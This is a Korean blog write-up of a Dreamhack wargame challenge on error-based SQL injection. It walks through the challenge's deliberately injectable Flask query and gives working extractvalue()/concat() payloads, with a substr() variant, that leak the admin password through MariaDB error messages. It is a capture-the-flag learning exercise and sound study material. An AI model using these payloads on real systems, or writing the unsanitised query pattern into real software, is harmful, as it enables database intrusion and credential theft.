---
title: "드림핵 lv.1 - error based sql injection"
date: 2025-02-28 00:10:00 +0800
categories: [Wargame, Dreamhack]
tags: [cyber security, writeup, dreamhack, web hacking, error based sql injection] 
description: 드림핵 error based sql injection 웹해킹 워게임 풀이
---

[https://dreamhack.io/wargame/challenges/412](https://dreamhack.io/wargame/challenges/412)
# 문제 설명
Simple Error Based SQL Injection !

---
# 문제 풀이
## 웹사이트 분석
사이트에 접속하게 되면 `uid` 값을 입력할 수 있고 내가 입력한 값이 포함된 쿼리문을 볼 수 있다.<br />

```
(1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'substr(1,1,1)'' at line 1")
```
error based 인젝션을 연습하는 문제이기 때문에 에러를 발생시킬 만한 쿼리를 작성해보니 위와 같은 에러 메세지가 발생한다. 내가 사용한 `uid` 값은 `' substr(1,1,1)`이다.<br />

여기서 알 수 있는 정보는 쿼리문이 성공했을 때에는 아무것도 뜨지 않지만 에러가 발생했을 때에는 그에 맞는 에러 메세지가 출력된다. 이를 이용해서 플래그를 알아낼 수 있을 것 같다.
## 코드 분석
```
[Code Structure]
deploy/
	- app.py
	- init.sql
	- requirements.txt
	- run.sh
DockerFile
```
### init.sql
```sql
CREATE DATABASE IF NOT EXISTS `users`;
GRANT ALL PRIVILEGES ON users.* TO 'dbuser'@'localhost' IDENTIFIED BY 'dbpass';

USE `users`;
CREATE TABLE user(
  idx int auto_increment primary key,
  uid varchar(128) not null,
  upw varchar(128) not null
);

INSERT INTO user(uid, upw) values('admin', 'DH{**FLAG**}');
INSERT INTO user(uid, upw) values('guest', 'guest');
INSERT INTO user(uid, upw) values('test', 'test');
FLUSH PRIVILEGES;
```
서버가 실행될 때 DB를 초기화해주는 정보가 담겨있는 파일이다. admin이라는 유저의 비밀번호가 플래그이다.
### app.py
```python
@app.route('/', methods=['POST', 'GET'])
def index():
    uid = request.args.get('uid')
    if uid:
        try:
            cur = mysql.connection.cursor()
            cur.execute(f"SELECT * FROM user WHERE uid='{uid}';")
            return template.format(uid=uid)
        except Exception as e:
            return str(e)
    else:
        return template
```
살펴볼 것도 없이 `uid`로 들어오는 값을 필터링하지 않고 바로 쿼리문에 집어넣고 있기 때문에 인젝션 취약점이 존재하는 코드이다.
## 최종 풀이
MYSQL에서 `extractvalue()` 함수를 이용하면 함수로 전달된 두 번째 인자의 명령어가 실행된 값을 에러메세지에서 얻어낼 수 있다.<br />
### 문제점
```sql
admin' and (SELECT extractvalue(1,concat(0x3a,(SELECT upw FROM user WHERE uid='admin')))) -- 
```
`uid`값으로 위의 문자열을 입력하면 `(1105, "XPATH syntax error: ':DH{c3968c78840750168774ad951...'")` 이런식으로 admin 유저의 `upw`가 출력이 된다.<br />

하지만 여기선 큰 문제가 있다. <br />
출력되는 결과에 글자 수 제한이 있기 때문이다. 그래서 플래그가 끝까지 나오지 않고 잘려서 나온다.
### substr()로 해결하기
```sql
admin' and (SELECT extractvalue(1,concat(0x3a,(SELECT substr(upw, 29, 20) FROM user WHERE uid='admin')))) --
```
이때 쿼리에 `substr()` 함수를 추가하면 그 뒤의 나머지 비밀번호를 얻어낼 수 있다. <br />
기존으로 출력된 비밀번호가 총 28자리 이니까 `substr(upw, 29, 20)`를 작성하여 29번째 자리부터 20자리까지 읽는 동작을 수행한다.<br />

이렇게 되면 에러 메세지로 나머지 비밀번호가 출력된다.
# 배운 것
`extractvalue()` 함수의 에러 메세지에는 출력할 수 있는 문자열의 길이에 상한선이 정해져있다는 것을 배웠다. <br />
그리고 이를 해결하기 위해서 다른 여러가지 방법들이 있지만 `substr()`도 방법이 될 수 있다는 것을 알게됐다.